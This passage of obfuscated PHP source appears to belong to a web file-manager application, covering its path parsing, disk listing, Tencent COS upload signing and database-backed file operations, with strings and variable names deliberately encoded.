"\x7b\165\163\145\162\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\106\151\154\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\x72\x46\151\154\x65\124\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\165\160\122\157\157\x74\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\173\x75\163\145\x72\123\x68\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\x72\x53\x68\x61\162\145\x4c\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\145\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\162\x65\x49\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\x65\111\x74\145\155\114\151\156\153\x7d"; const KOD_SEARCH = "\173\x73\x65\141\162\143\150\x7d"; const KOD_BLOCK = "\173\x62\x6c\x6f\x63\153\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\173\165\x73\x65\x72\x52\x65\x6e\x63\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\x65\x72\x7d"; public static function typeList() { $œ¥€¾ì÷ =& $_SERVER[å¸¿•¶£]; return array($œ¥€¾ì÷[1258] => self::KOD_SOURCE, $œ¥€¾ì÷[1259] => self::KOD_USER_RECYCLE, $œ¥€¾ì÷[1260] => self::KOD_USER_FAV, $œ¥€¾ì÷[1261] => self::KOD_USER_FILE_TAG, $œ¥€¾ì÷[1262] => self::KOD_USER_FILE_TYPE, $œ¥€¾ì÷[1263] => self::KOD_GROUP_ROOT_SELF, $œ¥€¾ì÷[1264] => self::KOD_USER_SHARE, $œ¥€¾ì÷[1265] => self::KOD_USER_SHARE_LINK, $œ¥€¾ì÷[1266] => self::KOD_USER_SHARE_TO_ME, $œ¥€¾ì÷[1267] => self::KOD_SHARE_ITEM, $œ¥€¾ì÷[1268] => self::KOD_SHARE_LINK, $œ¥€¾ì÷[1269] => self::KOD_SEARCH, $œ¥€¾ì÷[1270] => self::KOD_BLOCK, $œ¥€¾ì÷[1271] => self::KOD_IO, $œ¥€¾ì÷[1272] => self::KOD_USER_RECENT, $œ¥€¾ì÷[1273] => self::KOD_USER_DRIVER); } public static function parse($¦€­È´) { $•ÑØşì÷ =& $_SERVER[å¸¿•¶£]; $¦€­È´ = self::clear($¦€­È´); $º²±ú„ = array_values(self::typeList()); preg_match($•ÑØşì÷[1274], $¦€­È´, $ÖƒšŸ™); $ğãö§¿ = array($•ÑØşì÷[422] => !1, $•ÑØşì÷[1275] => !1, $•ÑØşì÷[419] => !1, $•ÑØşì÷[84] => $¦€­È´, $•ÑØşì÷[1176] => !1, $•ÑØşì÷[1175] => $•ÑØşì÷[12]); if (is_array($ÖƒšŸ™) && count($ÖƒšŸ™) == 5) { $Øñ«© = $•ÑØşì÷[1276] . $ÖƒšŸ™[2] . $•ÑØşì÷[327]; if (in_array($Øñ«©, $º²±ú„)) { $ğãö§¿[$•ÑØşì÷[1176]] = $ÖƒšŸ™[1]; $ğãö§¿[$•ÑØşì÷[33]] = $Øñ«©; $ğãö§¿[$•ÑØşì÷[1277]] = substr($Øñ«©, 1, -1); $ğãö§¿[$•ÑØşì÷[399]] = $ÖƒšŸ™[3]; } $ğãö§¿[$•ÑØşì÷[1175]] = $ÖƒšŸ™[4]; } $¤İÊŸÕ’ = array($•ÑØşì÷[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ğãö§¿[$•ÑØşì÷[1240]] = in_array($ğãö§¿[$•ÑØşì÷[33]], $¤İÊŸÕ’); return $ğãö§¿; } public static function isTruePath($í®´â¿º) { $Å£ığÔ =& $_SERVER[å¸¿•¶£]; if (substr($í®´â¿º, 0, 1) != $Å£ığÔ[1276]) { return !0; } if (strpos($í®´â¿º, $Å£ığÔ[408]) === 0) { return !0; } if (strpos($í®´â¿º, $Å£ığÔ[1244]) === 0) { return !0; } if (strpos($í®´â¿º, $Å£ığÔ[1278]) === 0) { return !0; } if (strpos($í®´â¿º, $Å£ığÔ[1279]) === 0) { return !0; } if (strpos($í®´â¿º, $Å£ığÔ[1280]) === 0) { return !0; } return !1; } public static function clear($…”òÛíÊ) { $¤©ÜüÛ“ =& $_SERVER[å¸¿•¶£]; $…”òÛíÊ = str_replace(array($¤©ÜüÛ“[1085], $¤©ÜüÛ“[231]), $¤©ÜüÛ“[53], $…”òÛíÊ); $…”òÛíÊ = str_replace($¤©ÜüÛ“[97], $¤©ÜüÛ“[8], $…”òÛíÊ); $ÒÕıüë² = $¤©ÜüÛ“[1281]; if (substr($…”òÛíÊ, 0, 3) == $¤©ÜüÛ“[1282]) { $…”òÛíÊ = substr($…”òÛíÊ, 3); } while (strstr($…”òÛíÊ, $ÒÕıüë²)) { $…”òÛíÊ = str_replace($ÒÕıüë², $¤©ÜüÛ“[8], $…”òÛíÊ); } $…”òÛíÊ = preg_replace($¤©ÜüÛ“[1283], $¤©ÜüÛ“[8], $…”òÛíÊ); if ($…”òÛíÊ == $¤©ÜüÛ“[8]) { return $¤©ÜüÛ“[8]; } $…”òÛíÊ = rtrim($…”òÛíÊ, $¤©ÜüÛ“[8]); return $…”òÛíÊ; } public static function sourceID($Ù”¯òõé) { $Æ­Ô‹èÙ =& $_SERVER[å¸¿•¶£]; $Ÿ¸Ñˆ¹ö = self::parse($Ù”¯òõé); if ($Ÿ¸Ñˆ¹ö[$Æ­Ô‹èÙ[33]] !== self::KOD_SOURCE) { show_json(LNG($Æ­Ô‹èÙ[1284]), !1); } return $Ÿ¸Ñˆ¹ö[$Æ­Ô‹èÙ[399]]; } public static function make($ø›Ì±Âç) { if (!$ø›Ì±Âç) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ø›Ì±Âç)); } public static function makeShare($ÈÑÚâ¤Ë, $»ãëíå˜) { return self::makePath(self::KOD_SHARE_ITEM, $ÈÑÚâ¤Ë, $»ãëíå˜); } public static function makeFileTypePath($ş¦î¦ĞÑ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ş¦î¦ĞÑ); } public static function makeFileTagPath($“ÓûÈ„ˆ) { return self::makePath(self::KOD_USER_FILE_TAG, $“ÓûÈ„ˆ); } public static function makePath($üÉ¢ç£, $›œ¾£ûŒ = '', $—Úïº½È = '') { $™¡Ëèü§ =& $_SERVER[å¸¿•¶£]; $¼ÖªÀ¼ = substr($üÉ¢ç£, 1, -1); $ ¶ïÉÄ§ = $™¡Ëèü§[1285] . $¼ÖªÀ¼ . $™¡Ëèü§[1286] . $›œ¾£ûŒ . $™¡Ëèü§[1287]; $ ¶ïÉÄ§ = $—Úïº½È ? $ ¶ïÉÄ§ . $—Úïº½È . $™¡Ëèü§[8] : $ ¶ïÉÄ§; return $ ¶ïÉÄ§; } public static function hashPath($³—Ñøâï, $«œó–¬ê = true) { $¹¸²ú÷ =& $_SERVER[å¸¿•¶£]; $Ê…Ş„×² = is_array($³—Ñøâï) ? $³—Ñøâï : IO::info($³—Ñøâï); $„°„¨‚ = _get($Ê…Ş„×², $¹¸²ú÷[1288], $¹¸²ú÷[12]); if (!$„°„¨‚ && isset($Ê…Ş„×²[$¹¸²ú÷[402]])) { $Ê…Ş„×² = IO::info(KodIO::make($Ê…Ş„×²[$¹¸²ú÷[402]])); $„°„¨‚ = _get($Ê…Ş„×², $¹¸²ú÷[1288], $¹¸²ú÷[12]); } if (!$„°„¨‚ && $«œó–¬ê) { $Èù¼ô = KodIO::parse($Ê…Ş„×²[$¹¸²ú÷[84]]); if (!$Èù¼ô[$¹¸²ú÷[33]]) { $„°„¨‚ = IO::hashSimple($Ê…Ş„×²[$¹¸²ú÷[84]]); } } if (!$„°„¨‚) { $„°„¨‚ = md5($Ê…Ş„×²[$¹¸²ú÷[84]] . $Ê…Ş„×²[$¹¸²ú÷[76]] . $Ê…Ş„×²[$¹¸²ú÷[85]]); } return $„°„¨‚; } public static function hashPathSafe($Ùî±ß¯, $ûİöÛ±› = true) { $›ÖıÉ =& $_SERVER[å¸¿•¶£]; $ÁµÛƒì¡ = self::hashPath($Ùî±ß¯, $ûİöÛ±›); return md5($ÁµÛƒì¡ . $›ÖıÉ[1289] . Model($›ÖıÉ[777])->get($›ÖıÉ[778])); } public static function initSystemPath() { $‹Â€¥¦ =& $_SERVER[å¸¿•¶£]; if (defined($‹Â€¥¦[1290])) { return; } define($‹Â€¥¦[1290], self::systemPath($‹Â€¥¦[1291])); define($‹Â€¥¦[1292], self::systemPath($‹Â€¥¦[1293])); define($‹Â€¥¦[1294], self::systemPath($‹Â€¥¦[1295])); define($‹Â€¥¦[1296], self::systemPath($‹Â€¥¦[1297])); IOHistory::bindEvent(); } public static function systemPath($ÒœàÁú) { $§¥ô¶Œï =& $_SERVER[å¸¿•¶£]; $àÂƒüºÙ = $§¥ô¶Œï[1298] . ucfirst($ÒœàÁú); $ÁÍÉ¢Â = Model($§¥ô¶Œï[777])->get($àÂƒüºÙ); if ($ÁÍÉ¢Â) { return $ÁÍÉ¢Â; } if ($ÒœàÁú == $§¥ô¶Œï[1291]) { $ÁÍÉ¢Â = self::make(Model($§¥ô¶Œï[832])->systemRootPathAdd($§¥ô¶Œï[534])); } else { $ÁÍÉ¢Â = self::systemPath($§¥ô¶Œï[1291]); $Æï´×¤Â = self::sourceID($ÁÍÉ¢Â); $ÁÍÉ¢Â = self::make(Model($§¥ô¶Œï[832])->mkdir($Æï´×¤Â, $ÒœàÁú)); } Model($§¥ô¶Œï[777])->set($àÂƒüºÙ, $ÁÍÉ¢Â); return $ÁÍÉ¢Â; } public static function systemFolder($‘õÔ­ò) { $˜¯±²¹á = IO_PATH_SYSTEM_SOURCE . $‘õÔ­ò; $Ú´Š¥…ù = Cache::get($˜¯±²¹á); if (!$Ú´Š¥…ù) { $Û²Ùâñ‚ = IO::infoFull($˜¯±²¹á); if (!$Û²Ùâñ‚) { $Ú´Š¥…ù = IO::mkdir($˜¯±²¹á, REPEAT_SKIP); } else { $Ú´Š¥…ù = $Û²Ùâñ‚[$_SERVER[å¸¿•¶£][84]]; } Cache::set($˜¯±²¹á, $Ú´Š¥…ù, 3600 * 10); } return $Ú´Š¥…ù; } public static function defaultDriver() { return Model($_SERVER[å¸¿•¶£][774])->defaultDriver(); } public static function defaultIO() { $†Õ÷©ï¦ =& $_SERVER[å¸¿•¶£]; $×÷„Âª = self::defaultDriver(); return $†Õ÷©ï¦[1299] . $×÷„Âª[$†Õ÷©ï¦[399]] . $†Õ÷©ï¦[1287]; } public static function defaultDriverInit() { static $© çû³— = false; if ($© çû³—) { return $© çû³—; } $© çû³— = IO::init(self::defaultIO()); return $© çû³—; } public static function fileTypeList() { $Ñ»¾§¼Ì =& $_SERVER[å¸¿•¶£]; $ÖÎúÜÆÔ = $GLOBALS[$Ñ»¾§¼Ì[6]][$Ñ»¾§¼Ì[1300]]; foreach ($ÖÎúÜÆÔ as $¨ş­¦ => $½ ƒ©Â‰) { $¨¨şê¡† = $Ñ»¾§¼Ì[1301] . $¨ş­¦; $ßÜø°èÍ = LNG($¨¨şê¡†); if ($¨¨şê¡† != $ßÜø°èÍ) { $ÖÎúÜÆÔ[$¨ş­¦][$Ñ»¾§¼Ì[32]] = $ßÜø°èÍ; } } return $ÖÎúÜÆÔ; } public static function diskList($“££³¤Å = true) { $ËĞÊå€ú = $_SERVER[å¸¿•¶£][1302]; if ($“££³¤Å) { $˜ãèŸ = Cache::get($ËĞÊå€ú); if (is_array($˜ãèŸ)) { return $˜ãèŸ; } } $˜ãèŸ = self::diskListGet(); Cache::set($ËĞÊå€ú, $˜ãèŸ, 60); return $˜ãèŸ; } public static function diskListGet() { $ÍÉç™¦ò =& $_SERVER[å¸¿•¶£]; $è©ïºíÈ = array(); if ($GLOBALS[$ÍÉç™¦ò[6]][$ÍÉç™¦ò[1303]] == $ÍÉç™¦ò[1304]) { $ë¸û©‘® = $ÍÉç™¦ò[1305]; for ($ÃÂŒ¨“Ü = 0; $ÃÂŒ¨“Ü < strlen($ë¸û©‘®); $ÃÂŒ¨“Ü++) { $•…ß†³Ş = $ë¸û©‘®[$ÃÂŒ¨“Ü] . $ÍÉç™¦ò[1306]; if (file_exists($•…ß†³Ş)) { $è©ïºíÈ[] = $•…ß†³Ş; } } return $è©ïºíÈ; } if (!function_exists($ÍÉç™¦ò[98])) { $è©ïºíÈ[] = $ÍÉç™¦ò[842]; return $è©ïºíÈ; } $·Í©Ù£ = explode($ÍÉç™¦ò[231], shell_exec($ÍÉç™¦ò[1307])); array_shift($·Í©Ù£); array_pop($·Í©Ù£); $åÚƒ½« = array($ÍÉç™¦ò[1308], $ÍÉç™¦ò[1309], $ÍÉç™¦ò[1310], $ÍÉç™¦ò[1311], $ÍÉç™¦ò[1312], $ÍÉç™¦ò[1313], $ÍÉç™¦ò[1314], $ÍÉç™¦ò[1315]); foreach ($·Í©Ù£ as $Ë¹ªîˆğ) { $ı´ëßÊÔ = preg_split($ÍÉç™¦ò[1316], $Ë¹ªîˆğ); $•…ß†³Ş = $ı´ëßÊÔ[count($ı´ëßÊÔ) - 1]; if (!strstr($ı´ëßÊÔ[0], $ÍÉç™¦ò[1317]) || !$•…ß†³Ş) { continue; } $ÕŠæÓé = rtrim($•…ß†³Ş, $ÍÉç™¦ò[8]) . $ÍÉç™¦ò[8]; if (in_array($ÕŠæÓé, $åÚƒ½«)) { continue; } $è©ïºíÈ[] = $ÕŠæÓé; } return $è©ïºíÈ; } public static function isSameDisk($Œ¦ğ˜²Ø, $±”­Úî) { $ûÃş÷™­ =& $_SERVER[å¸¿•¶£]; if ($GLOBALS[$ûÃş÷™­[6]][$ûÃş÷™­[1303]] == $ûÃş÷™­[1304]) { return strtolower(substr($Œ¦ğ˜²Ø, 0, 1)) == strtolower(substr($±”­Úî, 0, 1)); } $ÏöÖúĞ¤ = self::diskList(); $àƒ‘Ä™¹ = !1; $ˆô«êšš = !1; sort($ÏöÖúĞ¤); $ÏöÖúĞ¤ = array_reverse($ÏöÖúĞ¤); $Œ¦ğ˜²Ø = rtrim($Œ¦ğ˜²Ø, $ûÃş÷™­[8]) . $ûÃş÷™­[8]; $±”­Úî = rtrim($±”­Úî, $ûÃş÷™­[8]) . $ûÃş÷™­[8]; foreach ($ÏöÖúĞ¤ as $‚‚šª•ª) { $£¤ıŒ½æ = strlen($‚‚šª•ª); if (!$àƒ‘Ä™¹ && substr($Œ¦ğ˜²Ø, 0, $£¤ıŒ½æ) == $‚‚šª•ª) { $àƒ‘Ä™¹ = $‚‚šª•ª; } if (!$ˆô«êšš && substr($±”­Úî, 0, $£¤ıŒ½æ) == $‚‚šª•ª) { $ˆô«êšš = $‚‚šª•ª; } if ($àƒ‘Ä™¹ && $ˆô«êšš) { break; } } return $àƒ‘Ä™¹ === $ˆô«êšš; } public static function transferType($ª¢şûœÇ, $½Ü¤ï…æ) { $ßÅø…¹† =& $_SERVER[å¸¿•¶£]; $ÉñÄÉ×œ = self::driverType($ª¢şûœÇ); $ŸÖ‹ÈŞ = self::driverType($½Ü¤ï…æ); if ($ÉñÄÉ×œ[$ßÅø…¹†[33]] == $ŸÖ‹ÈŞ[$ßÅø…¹†[33]] && $ÉñÄÉ×œ[$ßÅø…¹†[1318]] == $ŸÖ‹ÈŞ[$ßÅø…¹†[1318]]) { return $ßÅø…¹†[1319]; } if ($ÉñÄÉ×œ[$ßÅø…¹†[33]] == $ßÅø…¹†[876] && $ŸÖ‹ÈŞ[$ßÅø…¹†[33]] == $ßÅø…¹†[106]) { return $ßÅø…¹†[1201]; } if ($ÉñÄÉ×œ[$ßÅø…¹†[33]] == $ßÅø…¹†[106] && $ŸÖ‹ÈŞ[$ßÅø…¹†[33]] == $ßÅø…¹†[876]) { return $ßÅø…¹†[107]; } return $ßÅø…¹†[1320]; } public static function driverType($—›Ñ…ª¦) { $ÎşºÁïñ =& $_SERVER[å¸¿•¶£]; $æ¤ñğ«¡ = str_replace($ÎşºÁïñ[1321], $ÎşºÁïñ[12], strtolower($—›Ñ…ª¦->getType())); if ($æ¤ñğ«¡ == $ÎşºÁïñ[764] || $æ¤ñğ«¡ == $ÎşºÁïñ[1322] || $æ¤ñğ«¡ == $ÎşºÁïñ[1323]) { $—›Ñ…ª¦ = self::defaultDriverInit(); } else { if ($æ¤ñğ«¡ == $ÎşºÁïñ[1211] || $æ¤ñğ«¡ == $ÎşºÁïñ[1324]) { $—›Ñ…ª¦ = IO::init($—›Ñ…ª¦->pathParse[$ÎşºÁïñ[1158]]); } } $†°‚åª° = $—›Ñ…ª¦->path; $æ¤ñğ«¡ = str_replace($ÎşºÁïñ[1321], $ÎşºÁïñ[12], strtolower($—›Ñ…ª¦->getType())); if ($æ¤ñğ«¡ == $ÎşºÁïñ[106]) { return array($ÎşºÁïñ[33] => $ÎşºÁïñ[106], $ÎşºÁïñ[1318] => $ÎşºÁïñ[12], $ÎşºÁïñ[84] => $†°‚åª°, $ÎşºÁïñ[95] => $—›Ñ…ª¦); } return array($ÎşºÁïñ[33] => $ÎşºÁïñ[876], $ÎşºÁïñ[1318] => $—›Ñ…ª¦->pathDriver, $ÎşºÁïñ[84] => $†°‚åª°, $ÎşºÁïñ[95] => $—›Ñ…ª¦); } public static function pathDriverType($î¨àÈ‡Ë) { return $î¨àÈ‡Ë ? self::driverType(IO::init($î¨àÈ‡Ë)) : !1; } public static function pathDriverLocal($óô‘ş‘®) { $ˆ¨ÛÀï¤ =& $_SERVER[å¸¿•¶£]; $¸´ìĞÇ† = $óô‘ş‘® ? self::driverType(IO::init($óô‘ş‘®)) : !1; return $¸´ìĞÇ†[$ˆ¨ÛÀï¤[33]] == $ˆ¨ÛÀï¤[106] ? !0 : !1; } public static function allowCover($¨åî«ÌÃ, $Ù„ÒğñÆ = true) { $‘‘©ù×Ä =& $_SERVER[å¸¿•¶£]; if (is_string($¨åî«ÌÃ)) { $¨åî«ÌÃ = IO::info($¨åî«ÌÃ); } if (!$¨åî«ÌÃ || $¨åî«ÌÃ[$‘‘©ù×Ä[33]] == $‘‘©ù×Ä[75] || $¨åî«ÌÃ[$‘‘©ù×Ä[76]] <= 100) { return !1; } if (isset($¨åî«ÌÃ[$‘‘©ù×Ä[1325]]) || !$¨åî«ÌÃ[$‘‘©ù×Ä[84]]) { return !1; } if (isset($¨åî«ÌÃ[$‘‘©ù×Ä[202]]) && !$¨åî«ÌÃ[$‘‘©ù×Ä[202]]) { return $¨åî«ÌÃ; } static $„ƒò£¶ = false; if (!$„ƒò£¶ || !$Ù„ÒğñÆ) { $Ëâ‚Õîû = self::driverType(IO::init($¨åî«ÌÃ[$‘‘©ù×Ä[84]])); $ˆ¬€–Œ¼ = $Ëâ‚Õîû[$‘‘©ù×Ä[95]]; $„ƒò£¶ = $‘‘©ù×Ä[1326]; if ($Ëâ‚Õîû[$‘‘©ù×Ä[33]] == $‘‘©ù×Ä[106]) { $„ƒò£¶ = $‘‘©ù×Ä[1327]; } if ($Ëâ‚Õîû[$‘‘©ù×Ä[95]] && isset($Ëâ‚Õîû[$‘‘©ù×Ä[95]]->config[$‘‘©ù×Ä[1328]]) && $Ëâ‚Õîû[$‘‘©ù×Ä[95]]->config[$‘‘©ù×Ä[1328]]) { $„ƒò£¶ = $‘‘©ù×Ä[1327]; } } return $„ƒò£¶ == $‘‘©ù×Ä[1327] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($…àäø¾) { parent::__construct($…àäø¾); $this->signatureVersion($_SERVER[å¸¿•¶£][216]); } public function uploadFormData($“¡Òûõ™, $µô¸×Èø = 3600) { $ìœ¿§ß‹ =& $_SERVER[å¸¿•¶£]; $˜ì–®†§ = $ìœ¿§ß‹[199]; $Ğ½‚’ÔŠ = $ìœ¿§ß‹[232]; $®™™­ÂÑ = $ìœ¿§ß‹[1329]; $Ù²·Åµ = gmdate($ìœ¿§ß‹[1330], time() + $µô¸×Èø); $©›´“ùŒ = (string) time() . $ìœ¿§ß‹[71] . (string) (time() + $µô¸×Èø); $°óÀ™‡ = array($ìœ¿§ß‹[1331] => $Ù²·Åµ, $ìœ¿§ß‹[1332] => array(array($ìœ¿§ß‹[1333] => $˜ì–®†§), array($ìœ¿§ß‹[1334] => $this->bucket), array($ìœ¿§ß‹[1335], $ìœ¿§ß‹[1336], $ìœ¿§ß‹[12]), array($ìœ¿§ß‹[1337] => $®™™­ÂÑ), array($ìœ¿§ß‹[1338] => $Ğ½‚’ÔŠ), array($ìœ¿§ß‹[1339] => $this->accessKey), array($ìœ¿§ß‹[1340] => $©›´“ùŒ))); $°óÀ™‡ = json_encode($°óÀ™‡); $”ú°™›ø = hash_hmac($ìœ¿§ß‹[232], $©›´“ùŒ, $this->secret); $¬é¸ş† = sha1($°óÀ™‡); $Ã¤úäÀ = hash_hmac($ìœ¿§ß‹[232], $¬é¸ş†, $”ú°™›ø); $‹ÚÜÙÚ = array($ìœ¿§ß‹[1333] => $˜ì–®†§, $ìœ¿§ß‹[1337] => $®™™­ÂÑ, $ìœ¿§ß‹[1341] => base64_encode($°óÀ™‡), $ìœ¿§ß‹[1338] => $Ğ½‚’ÔŠ, $ìœ¿§ß‹[1339] => $this->accessKey, $ìœ¿§ß‹[1342] => $©›´“ùŒ, $ìœ¿§ß‹[1343] => $Ã¤úäÀ, $ìœ¿§ß‹[182] => $this->getHost()); return $‹ÚÜÙÚ; } public function fileOutLink($„Ÿóé»») { $†ğªßš¹ =& $_SERVER[å¸¿•¶£]; if (substr($„Ÿóé»», 0, 7) == $†ğªßš¹[1344]) { $„Ÿóé»» = $†ğªßš¹[1345] . substr($„Ÿóé»», 7); } header($†ğªßš¹[161] . $„Ÿóé»»); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¢º’ÜÙ¦) { $this->pathParse = $¢º’ÜÙ¦; $this->model = Model($_SERVER[å¸¿•¶£][1346]); } public function getPath($ŞÇ‹éïı) { return trim($ŞÇ‹éïı, $_SERVER[å¸¿•¶£][8]); } public function pathFather($×ÀÄğò) { $–”„çÔ­ = $this->parse($×ÀÄğò); $–”„çÔ­ = $this->infoSimple($×ÀÄğò); return $–”„çÔ­ ? $–”„çÔ­[$_SERVER[å¸¿•¶£][432]] : !1; } public function pathThis($çŒ×úÚ) { $™½ ¥ÔÈ = $this->infoSimple($çŒ×úÚ); return $™½ ¥ÔÈ ? $™½ ¥ÔÈ[$_SERVER[å¸¿•¶£][32]] : !1; } public function getPathOuter($ĞÎÀ°şĞ) { if (!$ĞÎÀ°şĞ) { return $ĞÎÀ°şĞ; } $ÕúÙæ = $this->parse($ĞÎÀ°şĞ); return KodIO::make($ÕúÙæ[$_SERVER[å¸¿•¶£][399]]); } public function copyFolderFromIO($¬şšÂ¢ë, $óí†µ­©, $¿Œ©¿—, $„èÜÍ§ş, $ğäéÅŒÃ) { $ãŒÈˆ³³ = $this->model->copyFolderFromIO($¬şšÂ¢ë, $óí†µ­©, $¿Œ©¿—, $„èÜÍ§ş, $ğäéÅŒÃ); return KodIO::make($ãŒÈˆ³³); } public function isParentOf($şÁÚö…, $¹ø§ııö) { return $this->model->isParentOf($şÁÚö…, $¹ø§ııö); } public function mkfile($èÜÜÀ„®, $È¡¶Ş•‰ = '', $…®“›ü = REPEAT_RENAME) { $şî¬†ë =& $_SERVER[å¸¿•¶£]; $Õ‹ÜªŒû = $this->parse($èÜÜÀ„®); $èÜÜÀ„® = $Õ‹ÜªŒû[$şî¬†ë[399]]; for ($÷Ï÷­§È = 0; $÷Ï÷­§È < count($Õ‹ÜªŒû[$şî¬†ë[1347]]); $÷Ï÷­§È++) { $¾”º„µ¯ = $Õ‹ÜªŒû[$şî¬†ë[1347]][$÷Ï÷­§È]; if ($÷Ï÷­§È == count($Õ‹ÜªŒû[$şî¬†ë[1347]]) - 1) { $èÜÜÀ„® = $this->model->mkfile($èÜÜÀ„®, $¾”º„µ¯, $È¡¶Ş•‰, $…®“›ü); break; } $èÜÜÀ„® = $this->model->mkdir($èÜÜÀ„®, $¾”º„µ¯, REPEAT_SKIP); } return $this->getPathOuter($èÜÜÀ„®); } public function mkdir($…ÇòÚ†Ÿ, $Ì®§Š‘¬ = REPEAT_SKIP) { $·óıÅË“ =& $_SERVER[å¸¿•¶£]; $•ä×âÙŒ = $this->parse($…ÇòÚ†Ÿ); $…ÇòÚ†Ÿ = $•ä×âÙŒ[$·óıÅË“[399]]; for ($—Á•ı–¸ = 0; $—Á•ı–¸ < count($•ä×âÙŒ[$·óıÅË“[1347]]); $—Á•ı–¸++) { $·óèíƒ = $•ä×âÙŒ[$·óıÅË“[1347]][$—Á•ı–¸]; $…ÇòÚ†Ÿ = $this->model->mkdir($…ÇòÚ†Ÿ, $·óèíƒ, $Ì®§Š‘¬); } return $this->getPathOuter($…ÇòÚ†Ÿ); } public function copyFile($í§Şã“, $İğ”éÎ, $ŞÂí…” = REPEAT_REPLACE) { $ğ´öÜ÷ =& $_SERVER[å¸¿•¶£]; $­¹ëŒõ = $this->parse($İğ”éÎ); $Å­à¯şó = $this->model->copy($í§Şã“, $­¹ëŒõ[$ğ´öÜ÷[399]], $ŞÂí…”, $­¹ëŒõ[$ğ´öÜ÷[84]]); return $Å­à¯şó ? $this->getPathOuter($Å­à¯şó) : !1; } public function moveFile($êä§ÎÎ°, $è‚ŒÇÅñ, $ñª—°Ê” = REPEAT_REPLACE) { $’°¸Ú¼ß =& $_SERVER[å¸¿•¶£]; $àéÔÃ = $this->parse($è‚ŒÇÅñ); $à¿“³ç´ = $this->model->move($êä§ÎÎ°, $àéÔÃ[$’°¸Ú¼ß[399]], $ñª—°Ê”, $àéÔÃ[$’°¸Ú¼ß[84]]); return $à¿“³ç´ ? $this->getPathOuter($à¿“³ç´) : !1; } public function copy($¦…Ëƒ, $¶÷¤ûÇ, $±üüö¤» = REPEAT_REPLACE, $öê¾ôé = false) { $Ğ˜“˜ì = $this->parse($¶÷¤ûÇ); $øÃÊ¿ = $this->model->copy($¦…Ëƒ, $Ğ˜“˜ì[$_SERVER[å¸¿•¶£][399]], $±üüö¤», $öê¾ôé); return $øÃÊ¿ ? $this->getPathOuter($øÃÊ¿) : !1; } public function moveSameAllow() { } public function move($¿±İÊú«, $óí¬Ô˜, $Ğ¾¬ÙÖ = REPEAT_REPLACE, $ÅÁæĞº¬ = false) { $¼ÚÜ¯— = $this->parse($óí¬Ô˜); $«Ù¯³ = $this->model->move($¿±İÊú«, $¼ÚÜ¯—[$_SERVER[å¸¿•¶£][399]], $Ğ¾¬ÙÖ, $ÅÁæĞº¬); return $«Ù¯³ ? $this->getPathOuter($«Ù¯³) : !1; } public function remove($âİ ¶Œ, $‚ñå¬¶ = true) { return $this->model->remove($âİ ¶Œ, $‚ñå¬¶); } public function rename($‚ÕÎ»ˆâ, $Õó‘ÖÂ‘) { $‹±â›Ì˜ = $this->model->rename($‚ÕÎ»ˆâ, $Õó‘ÖÂ‘); return $‹±â›Ì˜ ? $this->getPathOuter($‚ÕÎ»ˆâ) : $‹±â›Ì˜; } public function size($×Øóˆ´®) { $©«º®íÕ = $this->infoSimple($×Øóˆ´®); return $©«º®íÕ ? $©«º®íÕ[$_SERVER[å¸¿•¶£][76]] : 0; } public function infoSimple($Òçú–•) { return $this->model->sourceInfo($Òçú–•); } public function info($ šî¬í) { return $this->infoParse($ šî¬í); } public function infoAuth($ˆş½¬º) { return $this->infoParse($ˆş½¬º, !1, !0); } public function infoWithChildren($±ô‚µÖÃ) { return $this->infoParse($±ô‚µÖÃ, !0); } protected function infoParse($®ÇË‚èÎ, $—áŞåïƒ = false, $¶ø±¡¼ = false) { if (!$—áŞåïƒ) { return $this->model->pathInfo($®ÇË‚èÎ, $¶ø±¡¼); } return $this->model->pathInfoMore($®ÇË‚èÎ); } public function infoFull($™šñ‘û›) { $€ä†ÜÙ· =& $_SERVER[å¸¿•¶£]; $¿ˆØ¹Ö¾ = explode($€ä†ÜÙ·[8], $™šñ‘û›); $¬Ç¤‰ˆ¸ = implode($€ä†ÜÙ·[8], array_splice($¿ˆØ¹Ö¾, 1)); return $this->model->pathInfoByPath($¿ˆØ¹Ö¾[0], $¬Ç¤‰ˆ¸); } public function hashSimple($·Ö‘Óá) { $¬ÀŞŠ¤• =& $_SERVER[å¸¿•¶£]; $ª©İœŒ = $this->infoWithChildren($·Ö‘Óá); return $ª©İœŒ[$¬ÀŞŠ¤•[170]][$¬ÀŞŠ¤•[177]]; } public function hashMd5($š§˜é­) { $Âï±‰Á =& $_SERVER[å¸¿•¶£]; $§²ò—™ı = $this->infoWithChildren($š§˜é­); return $§²ò—™ı[$Âï±‰Á[170]][$Âï±‰Á[176]]; } public function exist($ô•¯‚æ) { $ˆ±»‹©Š =& $_SERVER[å¸¿•¶£]; $’«¯ªÎì = $this->parse($ô•¯‚æ); if (!$’«¯ªÎì[$ˆ±»‹©Š[84]]) { return $this->isFile($ô•¯‚æ) || $this->isFolder($ô•¯‚æ); } $‡Àø˜İê = array($ˆ±»‹©Š[401] => $’«¯ªÎì[$ˆ±»‹©Š[399]], $ˆ±»‹©Š[32] => $’«¯ªÎì[$ˆ±»‹©Š[84]]); $ãòÃÎ°÷ = $this->model->where($‡Àø˜İê)->find(); return $ãòÃÎ°÷ ? !0 : !1; } public function isFile($ÚèÕó¡Ó) { $ –ü®ıÕ =& $_SERVER[å¸¿•¶£]; $³­À¯€“ = $this->infoSimple($ÚèÕó¡Ó); return $³­À¯€“ && $³­À¯€“[$ –ü®ıÕ[410]] == $ –ü®ıÕ[88] ? !1 : !0; } public function isFolder($ÛÆÍóîÆ) { 